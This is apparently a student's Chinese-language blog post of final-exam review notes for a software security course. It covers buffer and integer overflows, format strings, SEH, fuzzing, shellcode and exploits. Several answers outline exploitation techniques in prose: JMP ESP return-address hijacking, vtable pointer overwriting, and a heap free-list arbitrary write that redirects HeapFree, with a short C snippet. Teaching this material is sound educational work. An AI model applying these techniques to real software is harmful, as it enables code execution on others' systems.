<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>软件安全期末复习 | lhldudu's blog</title><meta name="author" content="Harrisonls2004"><meta name="copyright" content="Harrisonls2004"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="授课：徐国胜 考试必备：概念题&#x2F;简答题名词解释题1.整数回绕 整数在固定位宽（如32位无符号&#x2F;有符号）表示下进行运算，结果超过可表示范围时会回到起始处继续计数（模2^n）。 常见风险：长度计算、内存分配大小计算出错，导致分配偏小进而引发溢出&#x2F;越界写。 2.缓冲区溢出攻击 计算机向缓冲区内填充数据位数超过了缓冲区本身的容量，溢出的数据覆盖在合法数据上，淹没局部变量、淹没">
<meta property="og:type" content="article">
<meta property="og:title" content="软件安全期末复习">
<meta property="og:url" content="https://harrisonls2004.github.io/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/index.html">
<meta property="og:site_name" content="lhldudu&#39;s blog">
<meta property="og:description" content="授课：徐国胜 考试必备：概念题&#x2F;简答题名词解释题1.整数回绕 整数在固定位宽（如32位无符号&#x2F;有符号）表示下进行运算，结果超过可表示范围时会回到起始处继续计数（模2^n）。 常见风险：长度计算、内存分配大小计算出错，导致分配偏小进而引发溢出&#x2F;越界写。 2.缓冲区溢出攻击 计算机向缓冲区内填充数据位数超过了缓冲区本身的容量，溢出的数据覆盖在合法数据上，淹没局部变量、淹没">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://harrisonls2004.github.io/img/softsec.jpg">
<meta property="article:published_time" content="2026-01-06T05:00:00.000Z">
<meta property="article:modified_time" content="2026-01-28T15:17:14.616Z">
<meta property="article:author" content="Harrisonls2004">
<meta property="article:tag" content="软件安全">
<meta property="article:tag" content="期末复习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://harrisonls2004.github.io/img/softsec.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "软件安全期末复习",
  "url": "https://harrisonls2004.github.io/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/",
  "image": "https://harrisonls2004.github.io/img/softsec.jpg",
  "datePublished": "2026-01-06T05:00:00.000Z",
  "dateModified": "2026-01-28T15:17:14.616Z",
  "author": [
    {
      "@type": "Person",
      "name": "Harrisonls2004",
      "url": "https://Harrisonls2004.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/logo.png"><link rel="canonical" href="https://harrisonls2004.github.io/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.4-b1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.7/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')

          if (theme === undefined) {
            if (mediaQueryLight.matches) activateLightMode()
            else if (mediaQueryDark.matches) activateDarkMode()
            else {
              const hour = new Date().getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            mediaQueryDark.addEventListener('change', () => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else {
            theme === 'light' ? activateLightMode() : activateDarkMode()
          }
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":true,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":100,"languages":{"author":"作者: Harrisonls2004","link":"链接: ","source":"来源: lhldudu's blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '软件安全期末复习',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/universe.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/bg.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">30</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 演唱会</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/softsec.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/logo.png" alt="Logo"><span class="site-name">lhldudu's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">软件安全期末复习</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 演唱会</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">软件安全期末复习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-06T05:00:00.000Z" title="发表于 2026-01-06 13:00:00">2026-01-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-28T15:17:14.616Z" title="更新于 2026-01-28 23:17:14">2026-01-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93/">复习总结</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">42.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>144分钟</span></span><span class="post-meta-separator">|</span><span id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span class="waline-pageview-count" data-path="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/#post-comment"><span class="waline-comment-count" data-path="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>授课：徐国胜</p>
<h2 id="考试必备：概念题-简答题"><a href="#考试必备：概念题-简答题" class="headerlink" title="考试必备：概念题&#x2F;简答题"></a>考试必备：概念题&#x2F;简答题</h2><h3 id="名词解释题"><a href="#名词解释题" class="headerlink" title="名词解释题"></a>名词解释题</h3><p><strong>1.整数回绕</strong></p>
<p>整数在<strong>固定位宽</strong>（如32位无符号&#x2F;有符号）表示下进行运算，结果<strong>超过可表示范围时</strong>会<strong>回到起始处继续计数</strong>（模2^n）。</p>
<p>常见风险：长度计算、内存分配大小计算出错，导致分配偏小进而引发溢出&#x2F;越界写。</p>
<p><strong>2.缓冲区溢出攻击</strong></p>
<p>计算机向缓冲区内<strong>填充数据位数超过了缓冲区本身的容量</strong>，溢出的数据<strong>覆盖在合法数据上</strong>，淹没<strong>局部变量</strong>、淹没<strong>返回地址。</strong></p>
<p><strong>3.恶意软件</strong></p>
<p>以<strong>危害系统、窃取信息、控制主机</strong>为目的的软件统称，如病毒、蠕虫、木马、勒索软件等。常通过漏洞、钓鱼、驱动&#x2F;浏览器组件等途径植入。</p>
<p><strong>4.有效用户ID</strong></p>
<p>在<strong>类Unix系统</strong>中用于<strong>权限判定的实际生效身份</strong>，决定<strong>进程访问文件、资源的权限</strong>；可<strong>与真实UID不同</strong>。</p>
<p><strong>5.竞争条件</strong></p>
<p><strong>并发执行</strong>的多个线程、进程在访问共享资源时，由于<strong>时序不确定导致结果依赖竞速顺序</strong>，产生<strong>逻辑错误或安全漏洞</strong>。</p>
<p><strong>6.ESP、EBP、EIP</strong></p>
<p>EAX：常用于<strong>记录返回值</strong>，以及用来进行算数运算。</p>
<p>ECX：<strong>常用于计数</strong>，以及用来算术运算。</p>
<p>ESP：<strong>扩展堆栈指针。</strong>这个寄存器<strong>指向堆栈的当前位置</strong>，并允许通过<strong>使用push和pop操作或者直接的指针操作</strong>来对堆栈中的内容进行添加和移除。</p>
<p>EBP：<strong>扩展基指针。</strong>主要用与<strong>存放在进入call以后的ESP的值</strong>，便于<strong>退出的时候回复ESP的值</strong>，达到<strong>堆栈平衡</strong>目的。</p>
<p>EIP：<strong>扩展指令指针。</strong>在<strong>调用一个函数</strong>时，这个指针被<strong>存储在堆栈中</strong>，用于后面的使用。在<strong>函数返回时</strong>，这个被存储的地址<strong>被用于决定下一个将被执行的指令的地址</strong>。</p>
<p><strong>7.代码注入</strong></p>
<p>攻击者将<strong>恶意代码注入到一个应用程序中</strong>，并使得<strong>这段代码在应用程序的上下文中被执行。</strong></p>
<p>8.弧注入</p>
<p>将<strong>控制转移</strong>到已经存在于<strong>程序内存空间中的代码</strong>中。</p>
<p>9.栈粉碎</p>
<p>由于<strong>向栈上的缓冲区写入过多数据</strong>而导致<strong>栈的正常结构被破坏</strong>的情况。</p>
<p>10.栈帧移位</p>
<p>程序<strong>重新被装入运行时</strong>，不同的<strong>环境</strong>会导致<strong>栈帧发生移位</strong>，先前查出的返回地址<strong>此时指向无效指令</strong>，<strong>静态的shellcode地址不能适应动态的内存变化</strong>。</p>
<p><strong>11.虚函数</strong></p>
<p>C++面向对象多态特性的重要机制。C++类的成员函数<strong>在声明时，</strong>若使用<strong>关键字virtual进行修饰</strong>，则被称为虚函数。</p>
<p>12.SEH </p>
<p><strong>异常处理结构体。</strong>每个SEH包含<strong>两个DWORD指针，SEH链表指针，异常处理函数句柄</strong>共8个字节。</p>
<p><strong>13.格式化输出</strong></p>
<p>格式化输出函数参数由<strong>一个格式字符串</strong>和<strong>可变数目的参数</strong>构成，格式化字符串提供了一组可以<strong>由格式化输出函数</strong>解释执行的指令，用户可以通过<strong>控制格式字符串的内容来控制格式化输出函数</strong>的执行。</p>
<p><strong>14.并行度</strong></p>
<p><strong>同一时刻实际并行执行的任务数量</strong>（例如多核同时执行多个线程）。与并发不同，<strong>并行强调同时运行。</strong></p>
<p><strong>15.堆栈缓冲区</strong></p>
<p>位于栈帧中的<strong>局部数组&#x2F;缓冲区</strong>（如char buf[200]）。其越界写可<strong>覆盖保存的返回地址、SEH结构</strong>等，典型利用为<strong>栈溢出。</strong></p>
<p><strong>16.异常抛出</strong></p>
<p>程序运行中<strong>发生异常事件并触发异常机制</strong>（如Windows SEH&#x2F;VEH&#x2F;未处理异常过滤器等），导致<strong>控制流转入异常处理路径</strong>；<strong>若异常处理结构可被覆盖，可能被利用执行任意代码。</strong></p>
<h3 id="简答题"><a href="#简答题" class="headerlink" title="简答题"></a>简答题</h3><p>1.对比植入shellcode中静态淹没返回地址与JMP ESP两种方式的优缺点。</p>
<p><strong>静态淹没返回地址</strong>：用大量<strong>重复的返回地址</strong>覆盖<strong>栈上返回地址区域</strong>（喷射&#x2F;淹没），通常配合<strong>NOP sled</strong>扩大命中。</p>
<p>优点：<strong>实现简单、对偏移误差容忍较高</strong>（可通过NOP&#x2F;重复地址提高命中）。</p>
<p>缺点：需要<strong>可预测的跳转目标地址</strong>；地址中若<strong>含0字节等可能受字符串函数限制</strong>；遇到栈随机化&#x2F;ASLR难度增加。</p>
<p><strong>JMP ESP方式</strong>：返回地址覆盖为<strong>某模块中的JMP ESP指令地址</strong>，使<strong>EIP跳到ESP指向处</strong>执行<strong>栈上shellcode，破坏栈帧结构。</strong></p>
<p>优点：不必精确知道<strong>shellcode绝对地址</strong>，只要<strong>能控制栈上内容</strong>；相对<strong>短跳转</strong>且结构清晰。</p>
<p>缺点：依赖<strong>可用的JMP ESP地址</strong>（受模块版本&#x2F;ASLR&#x2F;DEP影响）；仍可能<strong>受坏字符限制</strong>（写返回地址时）。</p>
<p>2.列举动态分配缓冲区的缺点。</p>
<ul>
<li><strong>易出现堆相关漏洞</strong>：使用后释放（UAF）、双重释放、堆溢出破坏链表指针等，利用面更复杂但后果严重。</li>
<li><strong>需要理解并依赖堆管理数据结构</strong>（如空闲链表、边界标志等），错误使用内存管理API可能引入漏洞。</li>
<li>在不同系统&#x2F;版本下<strong>堆布局与分配策略差异大</strong>，<strong>漏洞复现与稳定利用</strong>更困难，环境依赖强、调试复杂、易受缓解策略影响。</li>
<li><strong>可能导致内存耗尽</strong>：若分配大小由外部输入控制，攻击者可通过构造输入反复申请大量内存，造成拒绝服务（DoS）。</li>
<li><strong>性能开销较大：</strong>动态分配涉及堆管理、空闲块查找及合并等操作，相比静态分配效率较低。</li>
</ul>
<p>3.简述虚函数的实现，并试述利用虚表对虚函数开展攻击的过程。假设声明了一个类vf，具有160字节的成员变量buf和虚函数test，main函数中可以通过溢出修改虚表，据此作答。</p>
<p>实现机制：</p>
<p>(1) 编译器<strong>为含虚函数的类生成虚函数表 VTBL（函数指针数组）。</strong></p>
<p>(2) 每个对象内存起始处<strong>保存虚表指针 VPTR</strong>，调用虚函数时先取VPTR定位VTBL，<strong>再取对应槽位的函数指针执行</strong>，实现运行时动态派发。</p>
<p>攻击思路（溢出改VPTR&#x2F;改VTBL条目）：</p>
<p>需要两个连续创建对象：[VPTR][buf(160 bytes)],[VPTR][buf(160 bytes)]</p>
<p>(1) <strong>攻击者构造特殊载荷：</strong>将shellcode 写到 buff 起始位置，在 buff 末尾构造fake VTBL，其中 test指向shellcode 的地址。</p>
<p>(2) <strong>buff 溢出覆盖对象 VPTR，使其指向 fake VTBL</strong>。当 test 被调用时，<strong>程序通过修改的VPTR 定位到fake VTBL</strong>，进而找到其中test 地址（指向 shellcode），并<strong>把 shellcode 当 test 执行</strong>。</p>
<p>(3) 某些情况下也可能覆盖VTBL地址，<strong>将test函数入口地址直接改成shellcode。</strong></p>
<p>4.什么是空闲内存列表，画出其关键数据结构。</p>
<p>空闲内存列表是<strong>堆管理器</strong>用于<strong>记录并组织空闲堆块</strong>的数据结构。当<strong>调用free</strong>释放内存时，空闲块会被插入空闲链表；当<strong>调用malloc&#x2F;HeapAlloc</strong> 分配内存时，管理器会在空闲链表中查找合适大小的空闲块并将其<strong>取出或分裂</strong>。</p>
<p>在Windows RTL Heap 中，空闲块通常通过多个双向链表按大小类别组织（可表示为Freelist[] 的链表头数组），<strong>每个链表头为LIST_ENTRY</strong>：</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image.png" alt="image.png"></p>
<p>当链表为空时，flink与blink都指向链表头自身。</p>
<p>5.不安全的API是导致字符串错误的重要原因，试列举并说明5个不安全的字符串API。</p>
<ul>
<li>strcpy(dst, src)：<strong>不检查长度，src过长直接溢出。</strong></li>
<li>strcat(dst, src)：<strong>不检查剩余空间，拼接可能越界。</strong></li>
<li>sprintf(buf, fmt, …)：<strong>不限制输出长度，格式化后可能写爆buf。</strong></li>
<li>gets(buf)：<strong>读取一行不做边界检查</strong>（经典栈溢出）。</li>
<li>scanf(“%s”, buf)：<strong>未限制宽度</strong>时可导致溢出（应使用%Ns）。</li>
</ul>
<p>6.先写出Fronklink技术实现代码，分析它给出实现攻击者提供4字节的数据写入到同样是攻击者指定的4字节地址的实例详细过程。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">BK = bin;</span><br><span class="line">FD = BK-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (FD != BK) &#123;</span><br><span class="line"><span class="keyword">while</span> (FD != BK &amp;&amp; S &lt; chunksize(FD)) &#123;</span><br><span class="line">FD = FD-&gt;fd; <span class="comment">// ①</span></span><br><span class="line">&#125;</span><br><span class="line">BK = FD-&gt;bk; <span class="comment">// ②</span></span><br><span class="line">&#125;</span><br><span class="line">P-&gt;bk = BK;</span><br><span class="line">P-&gt;fd = FD;</span><br><span class="line">FD-&gt;bk = BK-&gt;fd = P <span class="comment">// ③</span></span><br></pre></td></tr></table></figure>

<p>利用空闲链表指针（flink&#x2F;blink）实现任意写的解释：释放后再写入已释放块的fp&#x2F;bp（等价flink&#x2F; blink），通过后续分配 &#x2F; 释放触发链表操作，完成覆盖目标地址为shellcode 地址，从而劫持控制流。</p>
<p>4 字节任意写过程（写“值&#x3D;bp”到“地址&#x3D;fp+4”）：</p>
<p>(1) 准备一个chunk, 其起始地址+12 为GOT表上HeapFree 函数地址-8。通过溢出修改FreeList 上的某个块（假设叫fifth）的fd为fake chunk。</p>
<p>(2) 将一个写有shellcode 的块释放（假设叫second）,second 的大小比 fifth 小, 那么会发生：成功进入while 语句, 在1 ⃝时 FD 被修改为Fakechunk 地址, 在2 ⃝时 BK被修改为HeapFree-8 地址, 在3 ⃝时BK+8, 也就是 HeapFree 被 Second 块地址替换，劫持 GOT 表。</p>
<p>7.请解释为什么格式化输出可能导致程序崩溃。</p>
<p><strong>(1) 栈参数错位 &#x2F; 读越界：</strong>格式化输出函数（如printf）是变参函数，运行时不检查参数数量和类型是否与格式字符串匹配。若格式串错误，函数会按格式说明从栈中取参数，可能读取非法数据并访问无效内存，导致程序崩溃。</p>
<p><strong>(2) %n 非法写内存：</strong>格式符%n会<strong>将已输出字符数写入指定地址</strong>，若该地址非法或不可写，会引发内存访问错误。</p>
<p><strong>(3) sprintf 缓冲区溢出：</strong>sprintf 不检查目标缓冲区大小，格式化结果过长会导致写越界，破坏相邻内存，从而造成程序异常或崩溃。</p>
<p>8.解释软件漏洞能够导致的后果有哪些？</p>
<p><strong>无法正常使用</strong>、引发<strong>恶性事件、关键数据丢失</strong>、<strong>秘密信息泄漏</strong>、<strong>被安装木马病毒</strong>。</p>
<p>9.简述Fuzz测试的思想，并描述针对文件的Fuzz测试的步骤和流程。</p>
<p><strong>技术思想：利用暴力</strong>来实现对目标程序的<strong>自动化测试</strong>，然后<strong>监视检查其最后的结果</strong>，如果<strong>符合某种情况</strong>就认为程序可能存在某种漏洞或者问题。暴力是利用<strong>不断地向目标程序发送</strong>或者<strong>传递不同格式的数据</strong>来测试目标程序的反应。</p>
<p><strong>文件格式Fuzz测试的基本方法：</strong></p>
<p>(1)以一个<strong>正常的文件模板</strong>作为基础，按照一定规则产生一批<strong>畸形文件</strong>。</p>
<p>(2)将畸形文件<strong>逐一送入软件进行解析</strong>，并<strong>监视软件是否会抛出异常</strong>。</p>
<p>(3)记录<strong>软件产生的错误信息</strong>，如<strong>寄存器状态、栈状态</strong>等。</p>
<p>(4)用<strong>日志或其他UI形式</strong>向测试人员<strong>展示异常信息</strong>，以进一步鉴定这些错误<strong>是否能被利用</strong></p>
<p>10.什么时候会发生整数溢出？</p>
<p><strong>当一个整数被增加超过其最大值或被减小小于其最小值时即会发生整数溢出，带符号和无符号的数都有可能发生溢出。</strong></p>
<p>（AI答案）当整数运算结果超过该类型的表示范围时发生：</p>
<ul>
<li>无符号：结果按<strong>模2^n回绕</strong>（回到0附近继续增加）</li>
<li>有符号：<strong>超过上界&#x2F;下界产生溢出</strong>。</li>
</ul>
<p>典型场景：len * sizeof(T)、count + header、(a+b)用于分配&#x2F;拷贝长度时超过最大值，导致分配过小继而越界写（与缓冲区漏洞强相关）。</p>
<p>11.说说什么是shellcode和exploit。并阐述他们关系。</p>
<p>shellcode是一段用于<strong>执行恶意操作</strong>的代码，exploit是<strong>一种技术或方法</strong>，<strong>用于发现和利用漏洞</strong>，以执行<strong>非预期</strong>的操作。</p>
<p>shellcode：通称<strong>缓冲区溢出攻击中植入进程的代码</strong>，广义上<strong>可以认为恶意代码。</strong></p>
<p>exploit：植入代码之前我们要做大量<strong>调试工作</strong>，弄清<strong>哪个输入会造成缓冲区溢出</strong>，计算<strong>函数返回地址和缓冲区的偏移并且淹没</strong>来使得shellcode得到执行。这个代码植入的过程就是漏洞利用，即exploit。</p>
<p>shellcode和exploit的关系<strong>：exploit一般以一段代码的形式出现</strong>，用于生成攻击性的网络数据包或者其他形式的攻击性输入。expliot的核心是<strong>淹没返回地址</strong>，劫持进程的控制权，之后跳转去执行shellcode。与shellcode具有一定的通用性不同，<strong>exploit往往是针对特定漏洞而言的</strong>。</p>
<h2 id="软件安全基础知识"><a href="#软件安全基础知识" class="headerlink" title="软件安全基础知识"></a>软件安全基础知识</h2><h3 id="软件安全漏洞基础"><a href="#软件安全漏洞基础" class="headerlink" title="软件安全漏洞基础"></a>软件安全漏洞基础</h3><p>1.漏洞：在软件逻辑缺陷中，有一部分如果被利用能够<strong>引起非常严重的后果</strong>。例如：SQL注入、跨站脚本、缓冲区溢出。我们通常把这类<strong>能够引起软件做一些超出设计范围的事情的bug</strong>称为漏洞。</p>
<p>2.漏洞与bug的区别：<strong>bug是功能性</strong>逻辑缺陷，<strong>漏洞是安全性</strong>逻辑缺陷。</p>
<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/f0296dc1914e07b48aac0e9eb48324e.png" alt="f0296dc1914e07b48aac0e9eb48324e.png"></p>
<p>3.软件漏洞的种类（知道有哪些）</p>
<p><strong>（1）缓冲区溢出漏洞</strong>：由于用户处理用户数据时使用了<strong>不限边界的拷贝</strong>，导致程序内部一些<strong>关键数据被覆盖</strong>，引发了安全问题，严重的缓冲区溢出漏洞会使得<strong>程序被利用而安装上木马或病毒。</strong></p>
<p><strong>（2）整数溢出漏洞：</strong>对于有符号的16位整数来说，它的最大值就是0x7fff，也就是十进制的32767，当赋值给一个整数的值为其最大值时，如果此时<strong>再加上1</strong>，就会发生整数型的溢出。</p>
<p><strong>（3）格式化字符串漏洞：</strong>格式化字符串漏洞是由于<strong>程序的数据输出函数中对输出数据的格式解析不当</strong>而发生的。</p>
